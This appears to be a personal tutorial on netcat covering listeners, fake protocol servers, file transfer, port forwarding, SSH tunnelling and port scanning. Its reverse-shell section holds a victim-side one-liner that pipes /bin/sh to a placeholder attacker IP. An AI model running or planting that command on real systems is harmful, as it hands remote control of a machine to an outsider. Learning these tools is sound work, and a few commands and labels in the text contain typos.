# Exploring the TCP/IP swiss army knife

## Setting up the listener
```bash
netcat -nvlp 8080
# -n -> don't perform DNS resolution
```

## Sending request from different servers using clients for different protocols

**Setting up the listener on 22 port SSH**
```bash
sudo netcat -nvlp 8080
```

**Making connection request from SSH client**
```bash
ssh user@localhost
```

![image](https://github.com/user-attachments/assets/6bb90f6f-ff78-4613-a681-4f4acfa5e050)

### Making mysql connection request

**Setting mysql server**
```bash
sudo netcat -nvlp 3306
```

**Sending the connection request from client**
```bash
mysql -h 127.0.0.1 -u someuser -p
# -h option forces for using TCP requeset instead of unix sockets
```

![image](https://github.com/user-attachments/assets/eb5f0120-dbbd-4367-bce1-6551445dae97)

### Making netcat as HTTP server and manually writing HTTP responses

**Setting up the http server**
```bash
netcat -nvlp 8080
```
**Sending HTTP request using curl**
```bash
curl -v localhost:8080
```
**Manually writing HTTP response**
```
HTTP/1.1 200 OK
Content-Length: 13
type: text/plain

Hello, World!
```

![image](https://github.com/user-attachments/assets/77129986-f170-40fa-91cc-38ec8f0c8db1)

## Setting up the Bidirectional communication using tcp client and server

**Creating server**
```bash
sudo netcat -nvlp 4000
```

**Creating client**
```bash
netcat localhost 4000
```

![image](https://github.com/user-attachments/assets/66cafcaf-f624-424a-9b8d-981333993133)

## File Transfer using netcat

**Listener (sender)**
```bash
nc -nvlp 4000 < file.txt 
```

**Client (Receiver)**
```bash
netcat localhost 4000 > copiedFile.txt
```

![image](https://github.com/user-attachments/assets/6aed78a1-8472-488e-8af3-f781856c783e)


## Illustrating gzip compression

![image](https://github.com/user-attachments/assets/d608b5f2-c353-48dd-81ed-42f1054358b7)

## Sending Data with gzip compressed

**Server**
```bash
nc -l -p 1234 | gunzip
nc -l -p 1234 | xxd # display bytes direclty
```

**Client**
```bash
python3 -c 'print("A"*1000)' | gzip -c | nc -q 0 localhost 1234
```

![image](https://github.com/user-attachments/assets/ad875a7c-3440-493e-be71-fecc44cc0c0b)

![image](https://github.com/user-attachments/assets/d8cd72e7-b054-4d11-85b2-dac4876e7e1c)

## Making a HTTP request
```bash
nc google.com 80
```
```
GET / HTTP/1.1
Host: google.com
User-Agent: Netcat
Accept: */*
```

## Banner Grabbing
- Make connection to the respective ports. The response from the server gives the banner

## Creating Reverse shell

**Attacker machine : Listener**
```bash
nc -nvlp 4444
```

**Victim machine**
```bash
mkfifo /tmp/f; nc <attacker_IP> 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
```

## Port Forwarding
**Forwarding port 8000 to 9000**
```bash
while true; do nc -l -p 9000 < /tmp/nc_pipe | nc localhost 8000 > /tmp/nc_pipe; done
```

**Setup the server on 8000**
```bash
python 3-m http.server
```

## Tunneling The traffic over ssh for encryption
**Server**
```bash
python3 -m http.server 8000
```

**Creating ssh tunnel from client(port 8080 to server port 8000)**
```bash
ssh -L 8080:localhost:8000 localhost
# run this on clinet
```

**Make requeset using browser or any otyer command line utility (from client)**
```bash
curl -v loclhost:8080
# note hte port, it's not 8000(server), it's 8000(client)
```

![image](https://github.com/user-attachments/assets/fde17763-cf29-4633-bd7a-3caebf51051b)

# Port Scanning using nmap
**Scanning a single port**
```bash
nc -zv localhost 80
```
![image](https://github.com/user-attachments/assets/7ce885e6-a54e-407b-8444-6fe07123dab1)

**Scanning range of IPs**
```bash
nc -zv localhost 1-100
```
![image](https://github.com/user-attachments/assets/5ec7889a-dc9e-4b48-9af9-88fd3db7e45d)

**Scanning using UDP**
```bash
nc -zv 127.0.0.53 53
```
![image](https://github.com/user-attachments/assets/c7d52220-bc46-4ccf-8cfb-5f6f536f90e6)


